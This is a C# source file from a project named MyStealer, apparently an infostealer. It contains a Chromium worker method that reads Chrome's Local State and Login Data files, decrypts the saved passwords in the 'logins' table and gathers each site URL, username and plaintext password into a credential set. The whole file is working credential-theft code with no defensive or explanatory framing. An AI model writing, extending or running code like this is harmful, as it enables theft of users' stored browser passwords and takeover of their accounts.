using System.Collections.Generic;
using System.IO;
using System;
using Serilog;

namespace MyStealer.Worker
{
    internal partial class Chromium : IWorker
    {
        public ISet<Credential> GetLoginDatas(string localStatePath, string loginDataPath)
        {
            var creds = new HashSet<Credential>();

            if (!File.Exists(localStatePath))
            {
                Log.Warning("[Chrome.Passwords] LocalState does not exists");
                return creds;
            }

            if (!File.Exists(loginDataPath))
            {
                Log.Warning("[Chrome.Passwords] LoginData file does not exists");
                return creds;
            }

            SQLiteHandler sqlDatabase;

            var decryptor = new ChromiumDecryptor(localStatePath);

            try
            {
                sqlDatabase = new SQLiteHandler(loginDataPath);
            }
            catch (Exception e)
            {
                Log.Warning(e, "[Chrome.Passwords] Error reading LoginData as sqlite");
                return creds;
            }

            if (!sqlDatabase.ReadTable("logins"))
            {
                Log.Warning("[Chrome.Passwords] Error reading 'logins' table from LoginData");
                return creds;
            }

            for (var i = 0; i < sqlDatabase.GetRowCount(); i++)
            {
                try
                {
                    var host = sqlDatabase.GetValue(i, "origin_url");
                    var username = sqlDatabase.GetValue(i, "username_value");
                    var password = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));

                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
                    {
                        creds.Add(new Credential
                        {
                            Application = Name,
                            Url = host,
                            Id = username,
                            Password = password
                        });
                    }
                }
                catch (Exception e)
                {
                    Log.Warning(e, "[Chrome.Passwords] Invalid login entry");
                }
            }

            return creds;
        }
    }
}
